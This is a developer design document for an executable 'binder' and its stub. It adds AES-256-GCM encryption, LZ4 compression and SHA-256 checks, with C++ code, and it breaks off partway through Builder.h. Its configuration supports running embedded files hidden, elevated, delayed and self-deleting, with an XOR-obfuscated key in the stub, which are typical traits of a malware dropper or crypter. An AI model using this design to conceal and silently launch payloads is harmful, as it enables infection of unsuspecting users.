# TorGames.Binder & Stub - Improvements Provision Document

## Table of Contents

1. [Overview](#overview)
2. [Architecture Changes](#architecture-changes)
3. [New Data Structures](#new-data-structures)
4. [AES-256-GCM Encryption Module](#aes-256-gcm-encryption-module)
5. [LZ4 Compression Module](#lz4-compression-module)
6. [SHA-256 Hashing Module](#sha-256-hashing-module)
7. [Builder Integration](#builder-integration)
8. [Stub Integration](#stub-integration)
9. [UI Updates](#ui-updates)
10. [Project Configuration](#project-configuration)
11. [Testing](#testing)

---

## Overview

This document provides complete implementation details for enhancing TorGames.Binder and TorGames.Binder.Stub with:

- **AES-256-GCM Encryption**: Secure encryption of all embedded resources using Windows BCrypt API
- **LZ4 Compression**: Fast compression reducing output file size by 40-60%
- **SHA-256 Integrity Verification**: Hash verification to detect tampering or corruption

### Build Pipeline (New)

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ Original     │───▶│ SHA-256      │───▶│ LZ4          │───▶│ AES-256-GCM  │───▶ Embedded
│ File         │    │ Hash         │    │ Compress     │    │ Encrypt      │     Resource
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
```

### Runtime Pipeline (Stub)

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ Embedded     │───▶│ AES-256-GCM  │───▶│ LZ4          │───▶│ SHA-256      │───▶ Execute
│ Resource     │    │ Decrypt      │    │ Decompress   │    │ Verify       │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
```

---

## Architecture Changes

### Directory Structure (After Implementation)

```
TorGames.Binder/
├── src/
│   ├── main.cpp
│   ├── core/
│   │   ├── common.h          (MODIFIED)
│   │   └── version.h
│   ├── builder/
│   │   ├── Builder.h         (MODIFIED)
│   │   └── Builder.cpp       (MODIFIED)
│   ├── crypto/
│   │   ├── Crypto.h          (NEW)
│   │   └── Crypto.cpp        (NEW)
│   ├── compression/
│   │   ├── Compression.h     (NEW)
│   │   └── Compression.cpp   (NEW)
│   ├── hash/
│   │   ├── Hash.h            (NEW)
│   │   └── Hash.cpp          (NEW)
│   ├── ui/
│   │   ├── MainWindow.h
│   │   └── MainWindow.cpp    (MODIFIED)
│   └── utils/
│       ├── utils.h
│       └── utils.cpp
├── lib/
│   └── lz4.h                 (NEW - External library)
└── res/
    ├── resource.h
    ├── resource.rc
    └── manifest.xml

TorGames.Binder.Stub/
├── src/
│   ├── main.cpp              (MODIFIED)
│   ├── common.h              (MODIFIED)
│   ├── Extractor.h           (MODIFIED)
│   ├── Extractor.cpp         (MODIFIED)
│   ├── Executor.h
│   ├── Executor.cpp
│   ├── crypto/
│   │   ├── Crypto.h          (NEW - shared)
│   │   └── Crypto.cpp        (NEW - shared)
│   ├── compression/
│   │   ├── Compression.h     (NEW - shared)
│   │   └── Compression.cpp   (NEW - shared)
│   └── hash/
│       ├── Hash.h            (NEW - shared)
│       └── Hash.cpp          (NEW - shared)
├── lib/
│   └── lz4.h                 (NEW - External library)
└── res/
    ├── resource.h
    └── resource.rc
```

---

## New Data Structures

### Updated common.h (Both Projects)

Replace the existing `common.h` with this updated version:

```cpp
// ============================================================================
// File: src/core/common.h (Binder) / src/common.h (Stub)
// Purpose: Shared data structures and constants
// ============================================================================

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <string>
#include <vector>
#include <cstdint>

// Resource type identifiers
#define RT_BINDER_CONFIG    256
#define RT_BINDER_FILE      257
#define RT_BINDER_KEY       258  // NEW: Encrypted key storage

// Configuration version (increment when format changes)
#define CONFIG_VERSION      2

// Encryption constants
#define AES_KEY_SIZE        32   // 256 bits
#define AES_IV_SIZE         12   // 96 bits for GCM
#define AES_TAG_SIZE        16   // 128-bit authentication tag
#define HASH_SIZE           32   // SHA-256 output

// Compression constants
#define COMPRESSION_NONE    0
#define COMPRESSION_LZ4     1

// Encryption constants
#define ENCRYPTION_NONE     0
#define ENCRYPTION_AES256   1

// Per-file configuration
struct BoundFileConfig {
    std::string filename;           // Filename (without path)
    std::string fullPath;           // Full path to source (Binder only)
    int executionOrder;             // Execution sequence number
    bool executeFile;               // Whether to execute this file
    bool waitForExit;               // Wait for process to complete
    bool runHidden;                 // Hide window during execution
    bool runAsAdmin;                // Request admin elevation
    std::string extractPath;        // Custom extraction path (empty = temp)
    std::string commandLineArgs;    // Command line arguments
    int executionDelay;             // Delay before execution (ms)
    bool deleteAfterExecution;      // Delete file after running
    DWORD fileSize;                 // Original file size
    DWORD compressedSize;           // Compressed size (NEW)
    std::string sha256Hash;         // SHA-256 hash of original file (NEW)
};

// Global binder configuration
struct BinderConfig {
    int configVersion;              // Config format version
    bool requireAdmin;              // Require admin for entire stub
    int compressionType;            // COMPRESSION_NONE or COMPRESSION_LZ4 (NEW)
    int encryptionType;             // ENCRYPTION_NONE or ENCRYPTION_AES256 (NEW)
    std::vector<BoundFileConfig> files;
};

// Encrypted data header (prepended to encrypted data)
struct EncryptedDataHeader {
    uint8_t iv[AES_IV_SIZE];        // Initialization vector
    uint8_t tag[AES_TAG_SIZE];      // Authentication tag
    uint32_t originalSize;          // Size before encryption
    uint32_t encryptedSize;         // Size after encryption
};

// Key storage structure (obfuscated in stub)
struct KeyStorage {
    uint8_t obfuscatedKey[AES_KEY_SIZE];  // XOR-obfuscated key
    uint8_t obfuscationMask[AES_KEY_SIZE]; // XOR mask
};
```

---

## AES-256-GCM Encryption Module

### Crypto.h

Create this file in `src/crypto/Crypto.h` for both Binder and Stub:

```cpp
// ============================================================================
// File: src/crypto/Crypto.h
// Purpose: AES-256-GCM encryption/decryption using Windows BCrypt API
// ============================================================================

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <bcrypt.h>
#include <vector>
#include <cstdint>
#include <string>

#pragma comment(lib, "bcrypt.lib")

namespace Crypto {

// Error codes
enum class CryptoError {
    Success = 0,
    InitializationFailed,
    KeyGenerationFailed,
    EncryptionFailed,
    DecryptionFailed,
    AuthenticationFailed,
    InvalidParameter,
    BufferTooSmall
};

// Result structure
struct CryptoResult {
    CryptoError error;
    std::string errorMessage;
    std::vector<uint8_t> data;
};

// Initialize the crypto module (call once at startup)
bool Initialize();

// Cleanup the crypto module (call at shutdown)
void Cleanup();

// Generate a cryptographically secure random key
CryptoResult GenerateKey(size_t keySize = 32);

// Generate a cryptographically secure random IV
CryptoResult GenerateIV(size_t ivSize = 12);

// Encrypt data using AES-256-GCM
// Returns: IV (12 bytes) + Tag (16 bytes) + Ciphertext
CryptoResult Encrypt(
    const uint8_t* plaintext,
    size_t plaintextSize,
    const uint8_t* key,
    size_t keySize = 32
);

// Decrypt data using AES-256-GCM
// Input format: IV (12 bytes) + Tag (16 bytes) + Ciphertext
CryptoResult Decrypt(
    const uint8_t* encryptedData,
    size_t encryptedSize,
    const uint8_t* key,
    size_t keySize = 32
);

// Convenience overloads for std::vector
CryptoResult Encrypt(
    const std::vector<uint8_t>& plaintext,
    const std::vector<uint8_t>& key
);

CryptoResult Decrypt(
    const std::vector<uint8_t>& encryptedData,
    const std::vector<uint8_t>& key
);

// Key obfuscation helpers (for storing key in stub)
std::vector<uint8_t> ObfuscateKey(
    const std::vector<uint8_t>& key,
    const std::vector<uint8_t>& mask
);

std::vector<uint8_t> DeobfuscateKey(
    const std::vector<uint8_t>& obfuscatedKey,
    const std::vector<uint8_t>& mask
);

// Generate obfuscation mask
std::vector<uint8_t> GenerateObfuscationMask(size_t size = 32);

} // namespace Crypto
```

### Crypto.cpp

Create this file in `src/crypto/Crypto.cpp`:

```cpp
// ============================================================================
// File: src/crypto/Crypto.cpp
// Purpose: AES-256-GCM implementation using Windows BCrypt API
// ============================================================================

#include "Crypto.h"
#include <memory>
#include <algorithm>

namespace Crypto {

// Global algorithm handle
static BCRYPT_ALG_HANDLE g_hAesAlg = nullptr;
static bool g_initialized = false;

bool Initialize() {
    if (g_initialized) {
        return true;
    }

    NTSTATUS status = BCryptOpenAlgorithmProvider(
        &g_hAesAlg,
        BCRYPT_AES_ALGORITHM,
        nullptr,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        return false;
    }

    // Set GCM mode
    status = BCryptSetProperty(
        g_hAesAlg,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM),
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(g_hAesAlg, 0);
        g_hAesAlg = nullptr;
        return false;
    }

    g_initialized = true;
    return true;
}

void Cleanup() {
    if (g_hAesAlg) {
        BCryptCloseAlgorithmProvider(g_hAesAlg, 0);
        g_hAesAlg = nullptr;
    }
    g_initialized = false;
}

CryptoResult GenerateKey(size_t keySize) {
    CryptoResult result;
    result.error = CryptoError::Success;
    result.data.resize(keySize);

    NTSTATUS status = BCryptGenRandom(
        nullptr,
        result.data.data(),
        static_cast<ULONG>(keySize),
        BCRYPT_USE_SYSTEM_PREFERRED_RNG
    );

    if (!BCRYPT_SUCCESS(status)) {
        result.error = CryptoError::KeyGenerationFailed;
        result.errorMessage = "Failed to generate random key";
        result.data.clear();
    }

    return result;
}

CryptoResult GenerateIV(size_t ivSize) {
    CryptoResult result;
    result.error = CryptoError::Success;
    result.data.resize(ivSize);

    NTSTATUS status = BCryptGenRandom(
        nullptr,
        result.data.data(),
        static_cast<ULONG>(ivSize),
        BCRYPT_USE_SYSTEM_PREFERRED_RNG
    );

    if (!BCRYPT_SUCCESS(status)) {
        result.error = CryptoError::KeyGenerationFailed;
        result.errorMessage = "Failed to generate random IV";
        result.data.clear();
    }

    return result;
}

CryptoResult Encrypt(
    const uint8_t* plaintext,
    size_t plaintextSize,
    const uint8_t* key,
    size_t keySize
) {
    CryptoResult result;
    result.error = CryptoError::Success;

    if (!g_initialized) {
        if (!Initialize()) {
            result.error = CryptoError::InitializationFailed;
            result.errorMessage = "Crypto module not initialized";
            return result;
        }
    }

    if (!plaintext || plaintextSize == 0 || !key || keySize != 32) {
        result.error = CryptoError::InvalidParameter;
        result.errorMessage = "Invalid parameters";
        return result;
    }

    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Generate key handle
    status = BCryptGenerateSymmetricKey(
        g_hAesAlg,
        &hKey,
        nullptr,
        0,
        (PUCHAR)key,
        static_cast<ULONG>(keySize),
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        result.error = CryptoError::KeyGenerationFailed;
        result.errorMessage = "Failed to create key handle";
        return result;
    }

    // Generate IV
    auto ivResult = GenerateIV(12);
    if (ivResult.error != CryptoError::Success) {
        BCryptDestroyKey(hKey);
        return ivResult;
    }

    // Setup auth info for GCM
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);

    std::vector<uint8_t> tag(16);
    authInfo.pbNonce = ivResult.data.data();
    authInfo.cbNonce = static_cast<ULONG>(ivResult.data.size());
    authInfo.pbTag = tag.data();
    authInfo.cbTag = static_cast<ULONG>(tag.size());

    // Get required output size
    ULONG ciphertextSize = 0;
    status = BCryptEncrypt(
        hKey,
        (PUCHAR)plaintext,
        static_cast<ULONG>(plaintextSize),
        &authInfo,
        nullptr,
        0,
        nullptr,
        0,
        &ciphertextSize,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        result.error = CryptoError::EncryptionFailed;
        result.errorMessage = "Failed to get ciphertext size";
        return result;
    }

    // Allocate output buffer: IV (12) + Tag (16) + Ciphertext
    result.data.resize(12 + 16 + ciphertextSize);

    // Copy IV to output
    std::copy(ivResult.data.begin(), ivResult.data.end(), result.data.begin());

    // Encrypt
    ULONG bytesWritten = 0;
    status = BCryptEncrypt(
        hKey,
        (PUCHAR)plaintext,
        static_cast<ULONG>(plaintextSize),
        &authInfo,
        nullptr,
        0,
        result.data.data() + 12 + 16,  // After IV and Tag
        ciphertextSize,
        &bytesWritten,
        0
    );

    BCryptDestroyKey(hKey);

    if (!BCRYPT_SUCCESS(status)) {
        result.error = CryptoError::EncryptionFailed;
        result.errorMessage = "Encryption failed";
        result.data.clear();
        return result;
    }

    // Copy tag to output (after IV)
    std::copy(tag.begin(), tag.end(), result.data.begin() + 12);

    // Resize to actual size
    result.data.resize(12 + 16 + bytesWritten);

    return result;
}

CryptoResult Decrypt(
    const uint8_t* encryptedData,
    size_t encryptedSize,
    const uint8_t* key,
    size_t keySize
) {
    CryptoResult result;
    result.error = CryptoError::Success;

    if (!g_initialized) {
        if (!Initialize()) {
            result.error = CryptoError::InitializationFailed;
            result.errorMessage = "Crypto module not initialized";
            return result;
        }
    }

    // Minimum size: IV (12) + Tag (16) + at least 1 byte ciphertext
    if (!encryptedData || encryptedSize < 29 || !key || keySize != 32) {
        result.error = CryptoError::InvalidParameter;
        result.errorMessage = "Invalid parameters";
        return result;
    }

    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Generate key handle
    status = BCryptGenerateSymmetricKey(
        g_hAesAlg,
        &hKey,
        nullptr,
        0,
        (PUCHAR)key,
        static_cast<ULONG>(keySize),
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        result.error = CryptoError::KeyGenerationFailed;
        result.errorMessage = "Failed to create key handle";
        return result;
    }

    // Extract IV and Tag from encrypted data
    std::vector<uint8_t> iv(encryptedData, encryptedData + 12);
    std::vector<uint8_t> tag(encryptedData + 12, encryptedData + 28);

    const uint8_t* ciphertext = encryptedData + 28;
    size_t ciphertextSize = encryptedSize - 28;

    // Setup auth info for GCM
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);

    authInfo.pbNonce = iv.data();
    authInfo.cbNonce = static_cast<ULONG>(iv.size());
    authInfo.pbTag = tag.data();
    authInfo.cbTag = static_cast<ULONG>(tag.size());

    // Get required output size
    ULONG plaintextSize = 0;
    status = BCryptDecrypt(
        hKey,
        (PUCHAR)ciphertext,
        static_cast<ULONG>(ciphertextSize),
        &authInfo,
        nullptr,
        0,
        nullptr,
        0,
        &plaintextSize,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        result.error = CryptoError::DecryptionFailed;
        result.errorMessage = "Failed to get plaintext size";
        return result;
    }

    // Allocate output buffer
    result.data.resize(plaintextSize);

    // Decrypt
    ULONG bytesWritten = 0;
    status = BCryptDecrypt(
        hKey,
        (PUCHAR)ciphertext,
        static_cast<ULONG>(ciphertextSize),
        &authInfo,
        nullptr,
        0,
        result.data.data(),
        plaintextSize,
        &bytesWritten,
        0
    );

    BCryptDestroyKey(hKey);

    if (!BCRYPT_SUCCESS(status)) {
        // STATUS_AUTH_TAG_MISMATCH = 0xC000A002
        if (status == 0xC000A002) {
            result.error = CryptoError::AuthenticationFailed;
            result.errorMessage = "Authentication tag mismatch - data may be tampered";
        } else {
            result.error = CryptoError::DecryptionFailed;
            result.errorMessage = "Decryption failed";
        }
        result.data.clear();
        return result;
    }

    result.data.resize(bytesWritten);
    return result;
}

CryptoResult Encrypt(
    const std::vector<uint8_t>& plaintext,
    const std::vector<uint8_t>& key
) {
    return Encrypt(plaintext.data(), plaintext.size(), key.data(), key.size());
}

CryptoResult Decrypt(
    const std::vector<uint8_t>& encryptedData,
    const std::vector<uint8_t>& key
) {
    return Decrypt(encryptedData.data(), encryptedData.size(), key.data(), key.size());
}

std::vector<uint8_t> ObfuscateKey(
    const std::vector<uint8_t>& key,
    const std::vector<uint8_t>& mask
) {
    if (key.size() != mask.size()) {
        return {};
    }

    std::vector<uint8_t> obfuscated(key.size());
    for (size_t i = 0; i < key.size(); ++i) {
        obfuscated[i] = key[i] ^ mask[i];
    }
    return obfuscated;
}

std::vector<uint8_t> DeobfuscateKey(
    const std::vector<uint8_t>& obfuscatedKey,
    const std::vector<uint8_t>& mask
) {
    // XOR is its own inverse
    return ObfuscateKey(obfuscatedKey, mask);
}

std::vector<uint8_t> GenerateObfuscationMask(size_t size) {
    auto result = GenerateKey(size);
    return result.data;
}

} // namespace Crypto
```

---

## LZ4 Compression Module

### Step 1: Download LZ4 Library

Download the LZ4 header-only library from https://github.com/lz4/lz4 and place `lz4.h` and `lz4.c` in the `lib/` directory.

Alternatively, use this single-header version in `lib/lz4.h`:

```cpp
// Download from: https://raw.githubusercontent.com/lz4/lz4/dev/lib/lz4.h
// And: https://raw.githubusercontent.com/lz4/lz4/dev/lib/lz4.c
// Combine them or include separately
```

### Compression.h

Create this file in `src/compression/Compression.h`:

```cpp
// ============================================================================
// File: src/compression/Compression.h
// Purpose: LZ4 compression wrapper
// ============================================================================

#pragma once

#include <vector>
#include <cstdint>
#include <string>

namespace Compression {

// Error codes
enum class CompressionError {
    Success = 0,
    CompressionFailed,
    DecompressionFailed,
    InvalidData,
    BufferTooSmall,
    InvalidParameter
};

// Result structure
struct CompressionResult {
    CompressionError error;
    std::string errorMessage;
    std::vector<uint8_t> data;
    size_t originalSize;
};

// Compress data using LZ4
// Output format: [4 bytes original size] + [compressed data]
CompressionResult Compress(
    const uint8_t* data,
    size_t dataSize
);

// Decompress LZ4 data
// Input format: [4 bytes original size] + [compressed data]
CompressionResult Decompress(
    const uint8_t* compressedData,
    size_t compressedSize
);

// Convenience overloads
CompressionResult Compress(const std::vector<uint8_t>& data);
CompressionResult Decompress(const std::vector<uint8_t>& compressedData);

// Get maximum compressed size for given input size
size_t GetMaxCompressedSize(size_t inputSize);

// Check if data appears to be LZ4 compressed (basic heuristic)
bool IsCompressed(const uint8_t* data, size_t dataSize);

} // namespace Compression
```

### Compression.cpp

Create this file in `src/compression/Compression.cpp`:

```cpp
// ============================================================================
// File: src/compression/Compression.cpp
// Purpose: LZ4 compression implementation
// ============================================================================

#include "Compression.h"

// Include LZ4 - adjust path as needed
#include "../lib/lz4.h"

#include <cstring>
#include <algorithm>

namespace Compression {

// Header structure: 4 bytes for original size
static const size_t HEADER_SIZE = 4;

CompressionResult Compress(const uint8_t* data, size_t dataSize) {
    CompressionResult result;
    result.error = CompressionError::Success;
    result.originalSize = dataSize;

    if (!data || dataSize == 0) {
        result.error = CompressionError::InvalidParameter;
        result.errorMessage = "Invalid input data";
        return result;
    }

    // Calculate max compressed size
    int maxCompressedSize = LZ4_compressBound(static_cast<int>(dataSize));
    if (maxCompressedSize <= 0) {
        result.error = CompressionError::CompressionFailed;
        result.errorMessage = "Failed to calculate compressed size bound";
        return result;
    }

    // Allocate buffer: header + compressed data
    result.data.resize(HEADER_SIZE + maxCompressedSize);

    // Store original size in header (little-endian)
    result.data[0] = static_cast<uint8_t>(dataSize & 0xFF);
    result.data[1] = static_cast<uint8_t>((dataSize >> 8) & 0xFF);
    result.data[2] = static_cast<uint8_t>((dataSize >> 16) & 0xFF);
    result.data[3] = static_cast<uint8_t>((dataSize >> 24) & 0xFF);

    // Compress
    int compressedSize = LZ4_compress_default(
        reinterpret_cast<const char*>(data),
        reinterpret_cast<char*>(result.data.data() + HEADER_SIZE),
        static_cast<int>(dataSize),
        maxCompressedSize
    );

    if (compressedSize <= 0) {
        result.error = CompressionError::CompressionFailed;
        result.errorMessage = "LZ4 compression failed";
        result.data.clear();
        return result;
    }

    // Resize to actual size
    result.data.resize(HEADER_SIZE + compressedSize);

    return result;
}

CompressionResult Decompress(const uint8_t* compressedData, size_t compressedSize) {
    CompressionResult result;
    result.error = CompressionError::Success;

    if (!compressedData || compressedSize < HEADER_SIZE) {
        result.error = CompressionError::InvalidParameter;
        result.errorMessage = "Invalid compressed data";
        return result;
    }

    // Read original size from header (little-endian)
    size_t originalSize =
        static_cast<size_t>(compressedData[0]) |
        (static_cast<size_t>(compressedData[1]) << 8) |
        (static_cast<size_t>(compressedData[2]) << 16) |
        (static_cast<size_t>(compressedData[3]) << 24);

    result.originalSize = originalSize;

    // Sanity check - prevent excessive allocation
    if (originalSize > 1024 * 1024 * 1024) { // 1GB max
        result.error = CompressionError::InvalidData;
        result.errorMessage = "Original size exceeds maximum (1GB)";
        return result;
    }

    // Allocate output buffer
    result.data.resize(originalSize);

    // Decompress
    int decompressedSize = LZ4_decompress_safe(
        reinterpret_cast<const char*>(compressedData + HEADER_SIZE),
        reinterpret_cast<char*>(result.data.data()),
        static_cast<int>(compressedSize - HEADER_SIZE),
        static_cast<int>(originalSize)
    );

    if (decompressedSize < 0) {
        result.error = CompressionError::DecompressionFailed;
        result.errorMessage = "LZ4 decompression failed - data may be corrupted";
        result.data.clear();
        return result;
    }

    if (static_cast<size_t>(decompressedSize) != originalSize) {
        result.error = CompressionError::InvalidData;
        result.errorMessage = "Decompressed size mismatch";
        result.data.clear();
        return result;
    }

    return result;
}

CompressionResult Compress(const std::vector<uint8_t>& data) {
    return Compress(data.data(), data.size());
}

CompressionResult Decompress(const std::vector<uint8_t>& compressedData) {
    return Decompress(compressedData.data(), compressedData.size());
}

size_t GetMaxCompressedSize(size_t inputSize) {
    return HEADER_SIZE + LZ4_compressBound(static_cast<int>(inputSize));
}

bool IsCompressed(const uint8_t* data, size_t dataSize) {
    if (!data || dataSize < HEADER_SIZE) {
        return false;
    }

    // Read claimed original size
    size_t claimedSize =
        static_cast<size_t>(data[0]) |
        (static_cast<size_t>(data[1]) << 8) |
        (static_cast<size_t>(data[2]) << 16) |
        (static_cast<size_t>(data[3]) << 24);

    // Basic sanity check: original size should be reasonable
    // and compressed size should be smaller or similar
    return claimedSize > 0 &&
           claimedSize < 1024 * 1024 * 1024 &&
           dataSize > HEADER_SIZE;
}

} // namespace Compression
```

---

## SHA-256 Hashing Module

### Hash.h

Create this file in `src/hash/Hash.h`:

```cpp
// ============================================================================
// File: src/hash/Hash.h
// Purpose: SHA-256 hashing using Windows BCrypt API
// ============================================================================

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <bcrypt.h>
#include <vector>
#include <string>
#include <cstdint>

#pragma comment(lib, "bcrypt.lib")

namespace Hash {

// SHA-256 hash size in bytes
static const size_t SHA256_SIZE = 32;

// Error codes
enum class HashError {
    Success = 0,
    InitializationFailed,
    HashingFailed,
    InvalidParameter
};

// Result structure
struct HashResult {
    HashError error;
    std::string errorMessage;
    std::vector<uint8_t> hash;  // 32 bytes for SHA-256
};

// Initialize the hash module (call once at startup)
bool Initialize();

// Cleanup the hash module (call at shutdown)
void Cleanup();

// Compute SHA-256 hash of data
HashResult SHA256(const uint8_t* data, size_t dataSize);

// Convenience overload
HashResult SHA256(const std::vector<uint8_t>& data);

// Hash a file
HashResult SHA256File(const std::string& filePath);

// Convert hash to hex string
std::string HashToHex(const std::vector<uint8_t>& hash);

// Convert hex string to hash bytes
std::vector<uint8_t> HexToHash(const std::string& hexString);

// Compare two hashes (constant-time)
bool CompareHashes(
    const std::vector<uint8_t>& hash1,
    const std::vector<uint8_t>& hash2
);

} // namespace Hash
```

### Hash.cpp

Create this file in `src/hash/Hash.cpp`:

```cpp
// ============================================================================
// File: src/hash/Hash.cpp
// Purpose: SHA-256 implementation using Windows BCrypt API
// ============================================================================

#include "Hash.h"
#include <fstream>
#include <memory>
#include <algorithm>
#include <sstream>
#include <iomanip>

namespace Hash {

// Global algorithm handle
static BCRYPT_ALG_HANDLE g_hSha256Alg = nullptr;
static bool g_initialized = false;

bool Initialize() {
    if (g_initialized) {
        return true;
    }

    NTSTATUS status = BCryptOpenAlgorithmProvider(
        &g_hSha256Alg,
        BCRYPT_SHA256_ALGORITHM,
        nullptr,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        return false;
    }

    g_initialized = true;
    return true;
}

void Cleanup() {
    if (g_hSha256Alg) {
        BCryptCloseAlgorithmProvider(g_hSha256Alg, 0);
        g_hSha256Alg = nullptr;
    }
    g_initialized = false;
}

HashResult SHA256(const uint8_t* data, size_t dataSize) {
    HashResult result;
    result.error = HashError::Success;

    if (!g_initialized) {
        if (!Initialize()) {
            result.error = HashError::InitializationFailed;
            result.errorMessage = "Hash module not initialized";
            return result;
        }
    }

    if (!data && dataSize > 0) {
        result.error = HashError::InvalidParameter;
        result.errorMessage = "Invalid parameters";
        return result;
    }

    // Get hash object size
    DWORD hashObjectSize = 0;
    DWORD resultSize = 0;
    NTSTATUS status = BCryptGetProperty(
        g_hSha256Alg,
        BCRYPT_OBJECT_LENGTH,
        reinterpret_cast<PUCHAR>(&hashObjectSize),
        sizeof(hashObjectSize),
        &resultSize,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        result.error = HashError::HashingFailed;
        result.errorMessage = "Failed to get hash object size";
        return result;
    }

    // Allocate hash object
    std::vector<uint8_t> hashObject(hashObjectSize);

    // Create hash object
    BCRYPT_HASH_HANDLE hHash = nullptr;
    status = BCryptCreateHash(
        g_hSha256Alg,
        &hHash,
        hashObject.data(),
        hashObjectSize,
        nullptr,
        0,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        result.error = HashError::HashingFailed;
        result.errorMessage = "Failed to create hash object";
        return result;
    }

    // Hash the data
    if (dataSize > 0) {
        status = BCryptHashData(
            hHash,
            const_cast<PUCHAR>(data),
            static_cast<ULONG>(dataSize),
            0
        );

        if (!BCRYPT_SUCCESS(status)) {
            BCryptDestroyHash(hHash);
            result.error = HashError::HashingFailed;
            result.errorMessage = "Failed to hash data";
            return result;
        }
    }

    // Get the hash
    result.hash.resize(SHA256_SIZE);
    status = BCryptFinishHash(
        hHash,
        result.hash.data(),
        static_cast<ULONG>(SHA256_SIZE),
        0
    );

    BCryptDestroyHash(hHash);

    if (!BCRYPT_SUCCESS(status)) {
        result.error = HashError::HashingFailed;
        result.errorMessage = "Failed to finish hash";
        result.hash.clear();
        return result;
    }

    return result;
}

HashResult SHA256(const std::vector<uint8_t>& data) {
    return SHA256(data.data(), data.size());
}

HashResult SHA256File(const std::string& filePath) {
    HashResult result;
    result.error = HashError::Success;

    if (!g_initialized) {
        if (!Initialize()) {
            result.error = HashError::InitializationFailed;
            result.errorMessage = "Hash module not initialized";
            return result;
        }
    }

    // Open file
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        result.error = HashError::InvalidParameter;
        result.errorMessage = "Failed to open file: " + filePath;
        return result;
    }

    // Get hash object size
    DWORD hashObjectSize = 0;
    DWORD resultSize = 0;
    NTSTATUS status = BCryptGetProperty(
        g_hSha256Alg,
        BCRYPT_OBJECT_LENGTH,
        reinterpret_cast<PUCHAR>(&hashObjectSize),
        sizeof(hashObjectSize),
        &resultSize,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        result.error = HashError::HashingFailed;
        result.errorMessage = "Failed to get hash object size";
        return result;
    }

    // Allocate hash object
    std::vector<uint8_t> hashObject(hashObjectSize);

    // Create hash object
    BCRYPT_HASH_HANDLE hHash = nullptr;
    status = BCryptCreateHash(
        g_hSha256Alg,
        &hHash,
        hashObject.data(),
        hashObjectSize,
        nullptr,
        0,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        result.error = HashError::HashingFailed;
        result.errorMessage = "Failed to create hash object";
        return result;
    }

    // Hash file in chunks
    const size_t BUFFER_SIZE = 65536; // 64KB chunks
    std::vector<uint8_t> buffer(BUFFER_SIZE);

    while (file.good()) {
        file.read(reinterpret_cast<char*>(buffer.data()), BUFFER_SIZE);
        std::streamsize bytesRead = file.gcount();

        if (bytesRead > 0) {
            status = BCryptHashData(
                hHash,
                buffer.data(),
                static_cast<ULONG>(bytesRead),
                0
            );

            if (!BCRYPT_SUCCESS(status)) {
                BCryptDestroyHash(hHash);
                result.error = HashError::HashingFailed;
                result.errorMessage = "Failed to hash file data";
                return result;
            }
        }
    }

    // Get the hash
    result.hash.resize(SHA256_SIZE);
    status = BCryptFinishHash(
        hHash,
        result.hash.data(),
        static_cast<ULONG>(SHA256_SIZE),
        0
    );

    BCryptDestroyHash(hHash);

    if (!BCRYPT_SUCCESS(status)) {
        result.error = HashError::HashingFailed;
        result.errorMessage = "Failed to finish hash";
        result.hash.clear();
        return result;
    }

    return result;
}

std::string HashToHex(const std::vector<uint8_t>& hash) {
    std::ostringstream oss;
    for (uint8_t byte : hash) {
        oss << std::hex << std::setw(2) << std::setfill('0')
            << static_cast<int>(byte);
    }
    return oss.str();
}

std::vector<uint8_t> HexToHash(const std::string& hexString) {
    std::vector<uint8_t> hash;

    if (hexString.length() % 2 != 0) {
        return hash;
    }

    hash.reserve(hexString.length() / 2);

    for (size_t i = 0; i < hexString.length(); i += 2) {
        std::string byteStr = hexString.substr(i, 2);
        uint8_t byte = static_cast<uint8_t>(std::stoul(byteStr, nullptr, 16));
        hash.push_back(byte);
    }

    return hash;
}

bool CompareHashes(
    const std::vector<uint8_t>& hash1,
    const std::vector<uint8_t>& hash2
) {
    if (hash1.size() != hash2.size()) {
        return false;
    }

    // Constant-time comparison to prevent timing attacks
    uint8_t result = 0;
    for (size_t i = 0; i < hash1.size(); ++i) {
        result |= hash1[i] ^ hash2[i];
    }

    return result == 0;
}

} // namespace Hash
```

---

## Builder Integration

### Updated Builder.h

Add these new methods and members to `src/builder/Builder.h`:

```cpp
// ============================================================================
// File: src/builder/Builder.h (UPDATED)
// Purpose: Builder class with encryption and compression support
// ============================================================================

#pragma once

#include "../core/common.h"
#include <string>
#include <vector>
#include <functional>

class Builder {
public:
    // Progress callback type
    using ProgressCallback = std::function<void(int percent, const std::string& status)>;

    Builder();
    ~Builder();

    // Set build configuration
    void SetConfig(const BinderConfig& config);

    // Set progress callback
    void SetProgressCallback(ProgressCallback callback);

    // Build the output executable
    // Returns true on success, false on failure
    bool Build(const std::string& outputPath);

    // Get last error message
    std::string GetLastError() const;

